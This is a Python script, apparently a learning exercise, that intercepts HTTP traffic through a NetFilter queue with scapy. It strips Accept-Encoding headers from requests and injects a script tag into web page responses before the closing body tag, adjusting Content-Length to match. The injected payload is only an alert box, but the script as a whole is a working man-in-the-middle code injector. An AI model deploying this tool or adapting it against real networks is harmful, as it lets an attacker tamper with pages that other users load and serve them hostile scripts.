#!user/bin/env

r""" >>>  python code_injector.py -n 'netfilter qnum'  <<<
    This script injects code in the html code of the webpage.
    It accepts one command line argument >>>
    * -n or --qnum : Queue number of the NetFilter Queue

    The script imports the following packages >>>
    * optparse       : It gets the command line arguments and parse their values. (an updated version of this package - "argparse" is included in python3).
    * re             : It finds the pattern in the given string.
    * scapy.all      : It manipulates the data packets.
    * netfilterqueue : It provides access to the packets that are stored in the queue. There are 3 types of queue - INPUT , OUTPUT and FORWARD.

"""

import netfilterqueue
import re
import scapy.all as scapy
import argparse

def get_cmd_args():
    r""" This function gets the command line arguments and returns them as key and values.
             The two keys are >>>
             - [variable_name].num : It contains the queue number in which the packets are stored.
        :return: A variable containing key - netfilter queue number.
        """
    parser = argparse.ArgumentParser()
    parser.add_argument("-n","--qnum",dest="num",help="NetFilter Queue Number")
    options = parser.parse_args()
    return options

def set_load(packet,load):
    r""" It sets the load of the packet to the load passed in the arguments. length and checksum of the packet are deleted and new length and checksum are recalculated by scapy.
    :param packet: Data packet passed
    :param load: load of Raw layer of packet
    :return: modified data packet with new load
    """
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    r""" It processes the packet passed in the argument.
    :param packet: Data packet
    :return: NONE
    """
    scapy_packet = scapy.IP(packet.get_payload())
    print("[+] Processing Packet...")
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] Request !!!!!")
            if "Accept-Encoding:" in load:
                load = re.sub("Accept-Encoding:.*?\\r\\n","",load)
        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response !!!!!")
            injection_code = "<script>alert('Shubhi');</script>"
            load = scapy_packet[scapy.Raw].load.replace("</body>",injection_code+"</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)",load)
            if content_length_search:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length)+len(injection_code)
                load = load.replace(content_length,str(new_content_length))
        if load!=scapy_packet[scapy.Raw].load:
            scapy_packet = set_load(scapy_packet, load)
            packet.set_payload(str(scapy_packet))
    scapy_packet.show()
    packet.accept()




options = get_cmd_args()
queue = netfilterqueue.NetfilterQueue()
queue.bind(options.num,process_packet)
queue.run()



